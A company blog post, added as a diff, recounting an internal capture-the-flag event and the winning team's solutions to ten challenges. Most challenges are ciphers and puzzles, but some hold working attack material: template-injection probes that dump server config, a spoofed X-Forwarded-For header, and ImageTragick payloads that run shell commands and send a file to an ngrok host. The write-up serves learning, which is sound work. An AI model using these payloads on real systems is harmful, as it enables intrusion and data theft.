@@ -1,0 +1,321 @@
+---
+layout: post
+title: Wingify CTF 2k21
+excerpt: Wingify CTF 2k21
+authorslug: team_tripod_ctf2k21
+author: Nikhil Garg, Brayan Abraham and Pranav Jindal
+---
+
+<div style="text-align:center; margin: 10px;">
+  <img src="/images/2021/05/ctf-hero-image.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+Here at Wingify, we love solving problems and puzzles. To spread this spirit of problem solving, we organized the fourth edition of [Capture The Flag](https://engineering.wingify.com/posts/wingify-capture-the-flag/). 
+
+In case you’re wondering, Capture the flag AKA CTF is a cybersecurity competition where the participants play hacker games or challenges to find hidden flags by either hacking, finding vulnerabilities, or solving codes legally and safely. It is a place where we can learn what happens when things are implemented improperly and protect ourselves. Generally, CTF is played as a team game.
+
+There are mainly three types of CTF:
+
+1. Jeopardy - Solve as many challenges as you can in a given amount of time. In Jeopardy, the challenges are present in unique and intriguing ways which can be solved using networking, programming, applications, mobile, forensics, reverse engineering, and cryptography.
+2. Attack-Defense - Attack a server to find the flag while denying access to your competitors. Your team has to do two tasks together - attack the system breaking through the defense in the server and defense made by other competitors and create fortification so that your competitors can’t get through.
+3. The third type is a combination of both Jeopardy and Attack-Defense.
+
+Our iteration of CTF was a 3 hour event was organized in a Jeopardy style format. Participants worked in groups of up to 3 to solve multiple challenges. Each challenge had a flag with the format flag{congr4tz_y0u_found_1t}.
+
+## Teams, Problems, and Scoring:
+
+The CTF 2k21 was open to all employees in Wingify and it provided a good chance for inter-departmental teams. We had around 15 teams who participated in the event though most of the participants were from the engineering team. 
+
+The problems were divided into three categories:
+- Easy - 500 pts
+- Medium - 1000 pts
+- Hard - 1500 pts
+
+The team which completes a challenge first was awarded additional points and as each team solves that challenge value of these extra points for the team decreases.
+
+Hints were available but would cost some points based on the level of difficulty.
+
+## Challenges and solutions
+
+The challenges for CTF 2K21 were named on countries with a tagline and a statement which acted as a hint for the challenges. All challenges are shared below in the entirety along with solutions from the winning team.
+
+### #1 Spain - FOCUS!!
+
+
+
+A Russian hacker left us something that allows us to track him in this image, can you find it?
+
+<div style="text-align:center; margin: 10px; width: 50%; margin: auto">
+  <img src="/images/2021/05/ctf-spain-question-image.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+#### Solution
+
+In this challenge, we get an image. A pitch-black image. So, it is a case of image steganography, but of what kind? There are so many ways to hide a message in an image that you can’t have a set of methods to look into to decode the message. We took two approaches:
+
+1. Look at the binary data of the image
+2. Edit the image using photo editing tools
+
+We found the flag the second way by the second method. On https://www.befunky.com/, we edited the exposure by maxing the brightness and reducing the contrast, and we found:
+
+<div style="text-align:center; margin: 10px; width: 50%; margin: auto">
+  <img src="/images/2021/05/ctf-spain-answer-image.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+So with the correct settings of brightness, contrast, and saturation, we found the flag.
+
+### #2 Brazil - I heard you are good at breaking codes, can you crack this ciphertext?
+
+
+
+`7=28LG<uI3AG'="~FCC%(;"C&N`
+
+#### Solution
+
+To crack this ciphertext. We first have to identify the cipher. Using https://www.dcode.fr/cipher-identifier, we found a list of possible ciphers. We decided to try each one of them one by one.
+
+1. ASCII85 - has invalid characters
+2. Substitution Cipher - not possible without a dictionary
+3. ROT47 gave us the right `flag{vkFxbpvVlQOurrTWjQrU}`
+
+### #3 Australia - Hey Ninja Hattori!
+
+
+
+Can you use your ninja skills to hack this website?
+
+Link: http://138.*.*.*:6142/home?name=Hattori
+
+#### Solution
+
+The link provided in the problem has something to do with query param `name`; The value passed in the query param was being printed on the served HTML.
+
+We tried putting values like CTF, flag, ctf_flag in the query param, and obviously, they did not work.
+
+It looked like a case of Server-Side Includes (SSI) Injection as the param was being executed at the server when we tried passing the value inside double braces like `{{34-12}}`. We got some direction here. We looked for the server/templating engine used using the network requests and found the server was Python-based Werkzeug.
+
+We looked for various possible exploits to access the server. We were able to print all the environment variables using `{{request.environ}}`, but the flag was not found there. Finally, after multiple tries, we found that the app config could also be printed using `{{config.items()}}` and the `flag{hzATagZTDGVvBpAwKKwz}` was hidden there.
+
+### #4 Egypt- Can you crack this flawless Zig-Zag ciphertext?
+
+
+
+`pXgf{lxt7gwleS8NICxac30}6R`
+
+#### Solution
+
+It was a simple one for us. We looked for multiple zig-zag ciphers that were available and tried them all. We tried to use https://www.dcode.fr/cipher-identifier cipher-identifier here. Rail fence cipher was a suggestion (though a bit below in the list), but it was named Zig-zag, so we gave it a try. We used this decoder https://www.dcode.fr/rail-fence-cipher and a quick CMD+F on the page directly led us to the `flag{wexcXlgSC3Rpx78I06tN}`
+
+### #5 Congo - Find the weakest password in this log file
+
+
+
+You know the drill!! Crack the hashes and capture the flag!
+
+Link 1: http://138.*.*.*:10007/system/login.php?username=name&password=password
+
+Link 2: https://drive.google.com/file/d/1QI6BVM5UCPrICNpBJX2p-q0LA8-GSLHV/view
+
+#### Solution
+
+The question seemed very straightforward, and we thought of following what it asked. The first link just needed the correct username and password combination. The log file shared was huge. It had around 200 usernames and hashes.
+
+We quickly did some VScode keyboard shortcut sorcery to extract only hashes out of the big log file, nicely sorted and separated by a newline. We started looking for websites where we could find dictionaries of already cracked hashes. We tried multiple websites, but none of them allowed us to bulk post hashes, and we had 200 of them to try. Fortunately, we found CrackStation.net accepted 20 hashes at once, and we thought of giving it a try. Initially, none of them worked. We had already tried 120 and were losing hope, but the next batch of 120-140 had a vulnerable hash and found the password.
+
+Final Link: http://138.*.*.*:10007/system/login.php?username=wscott83&password=Password1983
+
+It worked flawlessly, and we found our `flag{NwcQbRSfUXEJ3Dhz13K9}`.
+
+### #6 Greenland - Admin has the power
+
+Administrators only have the power to see the flag, can you be one?
+
+<div style="text-align:center; margin: 10px;width: 100%; margin: auto">
+  <img src="/images/2021/05/ctf-waf-img.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+Link: http://138.*.*.*:10007/waf/
+
+#### Solution
+
+When the page opened, it displayed a straight-up message that our user-agent was not acceptable. We tried changing the user agent of the requests manually to various devices but to use. Then analyzing the page headers, we found a header called Supported UA, which said `Py-Requests`.
+
+We tried making a request using the following python script:
+
+```python
+import requests
+
+r = requests.get('http://138.*.*.*:10007/waf/')
+
+print(r.text)
+```
+
+We got a result that only valid IP addresses are allowed, along with a list of IP addresses. Using the list, we made a new request.
+
+```python
+import requests
+
+r = requests.get('http://138.*.*.*:10007/waf/', headers={'X-Forwarded-For':'1.3.3.7'})
+
+print(r.text)
+```
+
+Which gave us the flag: `flag{1bOYFQQ8YXDX3ZVMfz3M}`.
+
+### #7 Japan - Crack the code
+
+
+
+Mr. Robot is the only person who can view the flag!
+
+Link: http://138.*.*.*:10007/mis/index.php?source=true
+
+#### Solution
+
+We got a PHP code, analyzing which we found we need to pass 3 query parameters to the URL - secret, username, and password. As per the PHP code, the values of these query parameters should match the following conditions:
+
+1. Removing the ‘hellowingify’ substring from the secret query parameter value will generate ‘hellowingify’ as a remainder.
+
+2. Value for username and password query parameters should be different
+
+3. Username and password must have the same sha1 hash result.
+
+We met the first condition by sending ‘hellohellowingifywingify’ string as the secret value. A simple search on the internet revealed a link where a few different strings having the same sha1 were listed. The link we used was https://3v4l.org/tT4l8. We copied two strings having the same sha1 from this website and sent them as username and password. The final values sent from our side:
+
+- secret = hellohellowingifywingify
+- username = aaroZmOk
+- password = aaK1STfY
+
+http://138.*.*.*:10007/mis/index.php?secret=hellohellowingifywingify&username=aaroZmOk&password=aaK1STfY
+
+This gave us the `flag{zNVqGkEaWrsTxmtmcJCm}`.
+
+### #8 Russia - The term hack-proof is a joke!!!
+
+
+
+They say this website is hack-proof. Can you prove them wrong?
+
+Link: http://138.*.*.*:10007
+
+#### Solution
+
+This challenge had this single link that served a simple page. The page had an input box asking for a key. Which key? Where to find it? We had no idea.
+
+We started with analyzing the page source of the website but to no luck. We found nothing. We started going through all the network requests the website was making. Luckily, we found that the default GET call was getting an extra HTTP response header named X-Key.
+
+It was a direction, and we tried putting the header value in the input box, but it didn’t work. The header value looked like encoded in Base64, so we tried with the decoded value. It again was a partial success as the message popup just said, “Nice try.”
+
+We kept trying but, we were clueless now. One thing we noticed was that the key changed every time. We thought of retrying it using a script. We quickly wrote a script to read the header, decode it and post it back to the server.
+
+```javascript
+var main = await fetch("http://138.*.*.*:10007/");
+var xkey = main.headers.get("X-Key");
+var form = new FormData();
+form.set("key", atob(xkey));
+var res = await fetch("http://138.*.*.*:10007/index.php", {
+  method: "POST",
+  body: form,
+});
+
+console.log(await res.text());
+```
+
+It worked. The catch was to utilize the X-key header very fast.
+We had our `flag{KApkMDVVCuFnLM6oYB3v}` in the response text.
+
+### #9 USA - Are you good at reverse engineering?
+
+
+
+Can you help us recover the flag from this APK file?
+
+Link: https://drive.google.com/file/d/1PwJg6M-74upIH50TaMdf5kFWj4ZXjlpb/view
+
+#### Solution
+
+This challenge had a link to an APK file, and we had to reverse engineer it to find the flag.
+
+First, we tried to unzip the APK file to check for any strings in the APK files but unzipping the APK files didn’t help much as most of the unzipped files were binary.
+
+Then we tried a tool to reverse engineer the apk. The tool we used was Apktool. This tool helped in decoding the apk and the entire code of the apk was available. Then the next thing we did was to search for any familiar strings in the apk. A simple “flag” string search led us to a url as seen below:
+
+<div style="text-align:center; margin: 10px;width: 80%; margin: auto">
+  <img src="/images/2021/05/ctf-usa-img1.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+We tried a simple get call to this url, but it failed. After more debugging, we found that we need to send username and password in the request body to fetch the flag. A simple “password” string search revealed an xml where the username and password value were defined:
+
+<div style="text-align:center; margin: 10px;width: 80%; margin: auto">
+  <img src="/images/2021/05/ctf-usa-img2.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+The final step was to send the username and password in the request body to the URL revealed in first screenshot and it returned the `flag{TVbTVuKnKLonxWaKAEmb}`.
+
+### #10 India - Alohomora
+
+
+
+Use this magical spell to unlock the doors!!
+
+Link: http://138.*.*.*:8080/
+
+#### Solution
+
+By looking at the website and the description of the challenge, we knew the site was vulnerable to **ImageTragick**. To confirm the vulnerability, we tried sending a simple http request to our local development site using the below payload.
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://test.com/i.jpg"|setsid /bin/curl https://9902da737e4a.ngrok.io")'
+pop graphic-context
+```
+
+When we uploaded this **mvg** file, we got a http request from the vulnerable application. This confirmed that the site was vulnerable to ImageTragick and it was using a vulnerable ImageMagick package to process images.
+
+<div style="text-align:center; margin: 10px;width: 100%; margin: auto">
+  <img src="/images/2021/05/ctf-india-img1.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+ 
+Now in order to access the flag, we needed to know the path of the file and the name of the file. So we listed out the current working directory using the **ls** command and forwarded the details to our local development server(Ngrok) using **Curl**.
+
+<div style="text-align:center; margin: 10px;width: 100%; margin: auto">
+  <img src="/images/2021/05/ctf-india-img2.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+
+Once we knew the path and the name of the file, we uploaded a new mvg payload and grabbed the flag `flag{1bOYFQQ8YXDX3ZVMfz3M}` from the vulnerable application.
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://test.com/i.jpg"|setsid /bin/cat flag.txt | /bin/curl -d @- https://9902da737e4a.ngrok.io")'
+pop graphic-context
+```
+
+<div style="text-align:center; margin: 10px; width: 100%; margin: auto">
+  <img src="/images/2021/05/ctf-india-img3.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+## A hard-fought battle
+
+As the event started, the challenge was fierce among the teams. Some teams quickly went through the easy challenges. *Team Kenshin* had the lead from the start as they had solved the USA challenge and earned 1500 points in one go. Our team, *Tripod*, had split the challenges individually. Each one analyzing the challenges and attempting to solve them. We got scared as we saw our competitors quickly going through the easy challenges and up in rankings. Soon, we put our minds together and started solving each challenge. Along with us, *Team Zion* was also nowhere near the top 5 in the initial 30 minutes.
+
+Anyway, as time progressed, we consistently kept solving the problems and got to the top position. We were able to solve all problems in around 50 minutes before the scheduled time. As we looked at the leaderboard, the other teams were at least 3000 points behind us. We eagerly waited to see who would come second. The battle for the second position went on for a photo finish fight between *Zion*, *Kenshin*, and *Fed up dangi*, but in the end, *Zion* came up victorious.
+
+**Team Tripod and Team Zion were declared as CTF winners at 3 pm.**
+
+<div style="text-align:center; margin: 10px;width: 80%; margin: auto">
+  <img src="/images/2021/05/ctf-score.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+  <img src="/images/2021/05/ctf-winners.png" style="box-shadow: 2px 2px 10px 1px #aaa">
+</div>
+
+
+## Conclusion
+
+CTF 2k21 at Wingify was an amazing experience and a great chance for learning. Competing with the whole engineering team with time running against us was exhilarating and finally, winning was something that made us happy. Solving challenges has become our second nature, so it was fun to solve challenges in a new way with a competition to win, and the adrenaline rush as we went through each puzzle was very exciting.
+
+Everyone at Wingify enjoyed it, even in the remote setup. The COVID care half-day off after the event made it a Friday well spent and a kick start to a great weekend.
+
+Stay safe and stay home!
